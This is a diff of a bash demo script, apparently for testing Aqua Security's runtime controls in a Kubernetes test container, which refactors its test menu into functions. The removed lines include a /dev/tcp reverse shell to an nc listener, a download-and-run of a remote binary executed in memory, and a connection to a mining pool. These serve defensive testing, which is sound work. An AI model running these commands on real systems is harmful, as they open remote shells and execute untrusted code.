@@ -18,14 +18,44 @@ print_logo() {
     echo "                                                   *%%                                    "
     echo "                                                                                          "
     echo "                                                                                          "
-    echo "                                                                                          "
-    echo "     Developed by: Stan Hoe, Solution Architect APJ                                       "
-    echo "                                                                                          "
+    echo "     Tool developed by: Stan Hoe, Solution Architect APJ                                       "
     echo "                                                                                          "
     echo "                                                                                          "
+}
+
+print_welcome_message() {
+    echo "=========================================================================================="
+    echo "                     Welcome to the Aqua Runtime Security POV Tool                        "
+    echo "=========================================================================================="
     echo "                                                                                          "
+    echo "     Explore various security features of Aqua Security with this interactive tool.       " 
+    echo "     Experience Real-time Malware Protection, Drift Prevention, and much more.            "
+    echo "     Get ready to dive into container security with Aqua!                                 "
     echo "                                                                                          "
-    echo "                                                                                          "
+    echo "=========================================================================================="
+}
+
+print_colored_message() {
+    local color="$1"
+    local message="$2"
+
+    case "$color" in
+        red)
+            echo -e "\033[0;31m$message\033[0m"
+            ;;
+        blue)
+            echo -e "\033[0;34m$message\033[0m"
+            ;;
+        green)
+            echo -e "\033[0;32m$message\033[0m"
+            ;;
+        yellow)
+            echo -e "\033[0;33m$message\033[0m"
+            ;;
+        *)
+            echo "Invalid color. Please choose from: red, blue, green, yellow."
+            ;;
+    esac
 }
 
 check_kubernetes_connection() {
@@ -34,15 +64,18 @@ check_kubernetes_connection() {
         echo -n "."
         sleep 0.2
     done
-    echo
+    print_colored_message green "[✓] Done"
+
     # Check if connected to a Kubernetes cluster
     if kubectl cluster-info &>/dev/null; then
-        echo "✓ Kubernetes cluster connected"
+        print_colored_message green "✓ Kubernetes cluster connected"
+        echo
     else
-        echo "✗ Error: Not connected to a valid Kubernetes cluster."
+        print_colored_message red "✗ Error: Not connected to a valid Kubernetes cluster."
         exit 1
     fi
 }
+
 
 check_aqua_agent_daemonset() {
     echo -n "Checking Aqua agent daemonset"
@@ -50,12 +83,14 @@ check_aqua_agent_daemonset() {
         echo -n "."
         sleep 0.2
     done
-    echo
+    print_colored_message green "[✓] Done"
+
     # Check if aqua-agent daemonset exists in the aqua namespace
     if kubectl get daemonset -n aqua aqua-agent &>/dev/null; then
-        echo "✓ Aqua agent daemonset found"
+        print_colored_message green "✓ Aqua Enforcer daemonset found"
+        echo
     else
-        echo "✗ Error: Aqua agent daemonset not found. Please deploy the Aqua Enforcer."
+        print_colored_message red "✗ Error: Aqua Enforcer daemonset not found. Please deploy the Aqua Enforcer."
         exit 1
     fi
 }
@@ -64,6 +99,174 @@ check_container_existence() {
     # Check if the aqua-test-container deployment already exists
     kubectl get deployment aqua-test-container >/dev/null 2>&1
     return $?
+}
+
+test_realtime_malware_protection() {
+    # Ask user if prerequisites are met
+    echo
+    print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
+    1. Create a Custom Policy with Real-time Malware Protection Control enabled
+    2. Ensure that the Real-time Malware Protection Control is set to 'Delete' action
+    3. Ensure that the Custom Policy is set to 'Enforce' mode"
+    echo
+    read -p "Proceed? (y/n): " prerequisites_met
+
+    case $prerequisites_met in
+        [Yy]*)
+            # Execute commands in the deployed container
+            if check_container_existence; then
+                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
+                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
+                echo
+                print_colored_message yellow "Executing 'ls -la' command in the container..."
+                echo
+                kubectl exec -it $pod_name --container $container_name -- ls -la
+                sleep 1.5
+                echo
+                print_colored_message yellow "Executing wget command in the container to download eicar AMP test file..."
+                echo
+                kubectl exec -it $pod_name --container $container_name -- wget https://raw.githubusercontent.com/stanezil/eicar/main/eicar.txt
+                if [ $? -eq 0 ]; then
+                    echo
+                    print_colored_message yellow "Eicar AMP test file downloaded successfully."
+                else
+                    echo
+                    print_colored_message red "Failed to download Eicar AMP test file."
+                fi
+                sleep 1.5
+                echo
+                print_colored_message yellow "Executing 'ls -la' command again in the container..."
+                echo
+                print_colored_message yellow "[!] Observe in the output below that the downloaded eicar file is not in sight because it has been deleted by Aqua."
+                echo 
+                kubectl exec -it $pod_name --container $container_name -- ls -la
+                echo
+                print_colored_message green "[✓] Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
+
+            else
+                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
+            fi
+            ;;
+        [Nn]*)
+            echo "Please ensure the prerequisites are met before proceeding."
+            ;;
+        *)
+            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            ;;
+    esac
+}
+
+test_drift_prevention() {
+    # Ask user if prerequisites are met
+    echo
+    print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
+    1. Create a Custom Policy with Drift Prevention Control enabled
+    2. Ensure that the Custom Policy is set to 'Enforce' mode"
+    echo
+    read -p "Proceed? (y/n): " prerequisites_met
+
+    case $prerequisites_met in
+        [Yy]*)
+            # Execute commands in the deployed container
+            if check_container_existence; then
+                # Add your drift prevention test logic here
+                echo "Drift prevention test logic goes here..."
+            else
+                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
+            fi
+            ;;
+        [Nn]*)
+            echo "Please ensure the prerequisites are met before proceeding."
+            ;;
+        *)
+            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            ;;
+    esac
+}
+
+test_block_cryptocurrency_mining() {
+    # Ask user if prerequisites are met
+    echo
+    print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
+    1. Create a Custom Policy with Block Cryptocurrency Mining Control enabled
+    2. Ensure that the Custom Policy is set to 'Enforce' mode"
+    echo
+    read -p "Proceed? (y/n): " prerequisites_met
+
+    case $prerequisites_met in
+        [Yy]*)
+            # Execute commands in the deployed container
+            if check_container_existence; then
+                # Add your block cryptocurrency mining test logic here
+                echo "Block cryptocurrency mining test logic goes here..."
+            else
+                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
+            fi
+            ;;
+        [Nn]*)
+            echo "Please ensure the prerequisites are met before proceeding."
+            ;;
+        *)
+            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            ;;
+    esac
+}
+
+test_block_fileless_execution() {
+    # Ask user if prerequisites are met
+    echo
+    print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
+    1. Create a Custom Policy with Block Fileless Execution Control enabled
+    2. Ensure that the Custom Policy is set to 'Enforce' mode
+    3. Ensure that Drift Prevention Control is disabled"
+    echo
+    read -p "Proceed? (y/n): " prerequisites_met
+
+    case $prerequisites_met in
+        [Yy]*)
+            # Execute commands in the deployed container
+            if check_container_existence; then
+                # Add your block fileless execution test logic here
+                echo "Block fileless execution test logic goes here..."
+            else
+                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
+            fi
+            ;;
+        [Nn]*)
+            echo "Please ensure the prerequisites are met before proceeding."
+            ;;
+        *)
+            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            ;;
+    esac
+}
+
+test_reverse_shell() {
+    # Ask user if prerequisites are met
+    echo
+    print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
+    1. Create a Custom Policy with Reverse Shell Control enabled
+    2. Ensure that the Custom Policy is set to 'Enforce' mode"
+    echo
+    read -p "Proceed? (y/n): " prerequisites_met
+
+    case $prerequisites_met in
+        [Yy]*)
+            # Execute commands in the deployed container
+            if check_container_existence; then
+                # Add your reverse shell test logic here
+                echo "Reverse shell test logic goes here..."
+            else
+                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
+            fi
+            ;;
+        [Nn]*)
+            echo "Please ensure the prerequisites are met before proceeding."
+            ;;
+        *)
+            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            ;;
+    esac
 }
 
 check_pod_status() {
@@ -88,9 +291,12 @@ deploy_test_container() {
 
     # Check if deployment was successful
     if [ $? -eq 0 ]; then
-        echo "Aqua test container deployed successfully."
+        echo
+        print_colored_message green "✓ Aqua test container deployed successfully."
+        echo
     else
-        echo "Failed to deploy Aqua test container."
+        print_colored_message red " Failed to deploy Aqua test container."
+        echo
     fi
 }
 
@@ -101,8 +307,7 @@ delete_test_container() {
 
 main() {
     print_logo
-
-    echo "Welcome to the Aqua Runtime Security POC Test Program!"
+    print_welcome_message
     echo
 
     check_kubernetes_connection
@@ -115,22 +320,26 @@ main() {
         if [[ "$redeploy_choice" =~ ^[Yy] ]]; then
             delete_test_container
             deploy_test_container
+            echo
         else
-            echo "Proceeding to options..."
+            echo "Proceeding to menu..."
+            echo
         fi
     else
-        echo "Aqua test container does not exist."
-        echo "Proceeding to options..."
+        print_colored_message yellow "[!] Aqua test container does not exist - Select option 1 to deploy."
+        echo
+        echo "Proceeding to menu..."
+        echo 
     fi
     echo
 
     while true; do
         echo "Please select an option:"
         echo "1. Deploy/Redeploy test container"
-        echo "2. Test Real-time Malware Protection"
+        echo "2. Test Real-time Malware Protection [Delete action]"
         echo "3. Test Drift Prevention"
         echo "4. Test Block Cryptocurrency Mining"
-        echo "5. Test Block Fileless Execution (*Must Turn off Drift Prevention Control)"
+        echo "5. Test Block Fileless Execution [Must Turn off Drift Prevention Control in Aqua Console]"
         echo "6. Test Reverse Shell"
         echo "7. Terminate Program"
         echo
@@ -142,90 +351,19 @@ main() {
                 deploy_test_container
                 ;;
             2)
-                # Execute commands in the deployed container
-                if check_container_existence; then
-                    pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
-                    container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
-                    echo "Executing 'ls -la' command in the container..."
-                    kubectl exec -it $pod_name --container $container_name -- ls -la
-                    echo "Executing wget command in the container..."
-                    kubectl exec -it $pod_name --container $container_name -- wget https://raw.githubusercontent.com/stanezil/eicar/main/eicar.txt
-                    if [ $? -eq 0 ]; then
-                        echo "Eicar AMP test file downloaded successfully."
-                        echo "Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
-                    else
-                        echo "Failed to download Eicar AMP test file."
-                    fi
-                    echo "Executing 'ls -la' command again in the container..."
-                    kubectl exec -it $pod_name --container $container_name -- ls -la
-                else
-                    echo "Aqua test container is not deployed. Please deploy it first."
-                fi
+                test_realtime_malware_protection
                 ;;
             3)
-                # Make a copy of /bin/ls and execute the copy
-                if check_container_existence; then
-                    pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
-                    container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
-                    echo "Copying '/bin/ls' to '/tmp/ls_copy' in the container..."
-                    kubectl exec -it $pod_name --container $container_name -- cp /bin/ls /tmp/ls_copy
-                    echo "Executing './ls_copy' command in the container..."
-                    kubectl exec -it $pod_name --container $container_name -- /tmp/ls_copy
-                    echo "Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
-                else
-                    echo "Aqua test container is not deployed. Please deploy it first."
-                fi
+                test_drift_prevention
                 ;;
             4)
-                # Test Block Cryptocurrency Mining
-                if check_container_existence; then
-                    pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
-                    container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
-                    echo "Executing 'wget us-east.cryptonight-hub.miningpoolhub.com:205' command in the container..."
-                    kubectl exec -it $pod_name --container $container_name -- wget us-east.cryptonight-hub.miningpoolhub.com:205
-                    echo "Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
-                else
-                    echo "Aqua test container is not deployed. Please deploy it first."
-                fi
+                test_block_cryptocurrency_mining
                 ;;
             5)
-                # Block Fileless Execution
-                if check_container_existence; then
-                    pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
-                    container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
-                    echo "Executing 'wget https://github.com/liamg/memit/releases/download/v0.0.3/memit-linux-amd64' command in the container..."
-                    kubectl exec -it $pod_name --container $container_name -- wget https://github.com/liamg/memit/releases/download/v0.0.3/memit-linux-amd64
-                    echo "Executing 'chmod +x memit-linux-amd64' command in the container..."
-                    kubectl exec -it $pod_name --container $container_name -- chmod +x memit-linux-amd64
-                    echo "Executing './memit-linux-amd64 https://raw.githubusercontent.com/MaherAzzouzi/LinuxExploitation/master/Fword2020/blacklist/blacklist' command in the container..."
-                    kubectl exec -it $pod_name --container $container_name -- ./memit-linux-amd64 https://raw.githubusercontent.com/MaherAzzouzi/LinuxExploitation/master/Fword2020/blacklist/blacklist
-                    echo "Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
-                else
-                    echo "Aqua test container is not deployed. Please deploy it first."
-                fi
+                test_block_fileless_execution
                 ;;
             6)
-                # Test Reverse Shell
-                if check_container_existence; then
-                    # Create a Centos pod with nc listener
-                    echo "Creating Centos pod"
-                    kubectl run centos --image=stanhoe/centos-nc:7 --command sleep infinity
-                    echo "Waiting for the Centos container pod to start running..."
-                    while ! kubectl get pods | grep centos | grep -q "Running"; do
-                        sleep 5
-                    done
-                    echo "Centos container pod is running. Configuring nc listener in Centos pod..."
-                    kubectl exec centos -- bash -c "nohup nc -l -p 12345 >/dev/null 2>&1 &" 
-                    echo "Retrieving IP address..."
-                    centos_pod_ip=$(kubectl get pods -o wide | grep centos | awk '{print $6}')
-                    echo "$centos_pod_ip"
-                    echo "Executing reverse shell from Aqua test container to Centos container..."
-                    aqua_test_container=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
-                    kubectl exec -it $aqua_test_container -- bash -c "exec id &>/dev/tcp/$centos_pod_ip/12345 <&1"
-                    echo "Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
-                else
-                    echo "Aqua test container is not deployed. Please deploy it first."
-                fi
+                test_reverse_shell
                 ;;
             7)
                 # Terminate the program
@@ -269,4 +407,3 @@ main() {
 }
 
 main
-
